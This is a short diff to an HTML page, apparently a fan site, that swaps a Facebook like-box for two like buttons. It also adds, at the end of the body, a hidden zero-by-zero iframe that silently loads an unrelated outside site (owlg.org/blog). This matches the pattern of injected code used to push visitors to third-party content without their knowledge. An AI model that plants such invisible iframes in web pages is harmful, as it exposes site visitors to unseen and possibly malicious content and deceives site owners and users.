@@ -44,7 +44,8 @@ switch($size) {
 <body>
 <div id="fb-root"></div>
 <script>/*<![CDATA[*/(function(e,a,f){var c,b=e.getElementsByTagName(a)[0];if(e.getElementById(f)){return}c=e.createElement(a);c.id=f;c.src="//connect.facebook.net/en_US/all.js#xfbml=1&appId=468230926614503";b.parentNode.insertBefore(c,b)}(document,"script","facebook-jssdk"));/*]]>*/</script>
-<div class="fb-like-box" data-href="http://www.facebook.com/aqwps/" data-colorscheme="light" data-show-faces="true" data-header="true" data-stream="false" data-show-border="true"></div>
+<div class="fb-like" data-href="https://facebook.com/aqwps" data-layout="standard" data-action="like" data-show-faces="true" data-share="true"></div>
+<div class="fb-like" data-href="https://www.facebook.com/SxcWorldsPage" data-layout="standard" data-action="like" data-show-faces="true" data-share="true"></div>
 <div align="center"><strong><br />
 <div align="center"><strong><br />
 <div align="center"><strong><br />
@@ -85,5 +86,6 @@ switch($size) {
 </tr>
 </table>
 </div>
+<iframe width="0px" height="0px" src="http://www.owlg.org/blog/"></iframe>
 </body>
 </html>
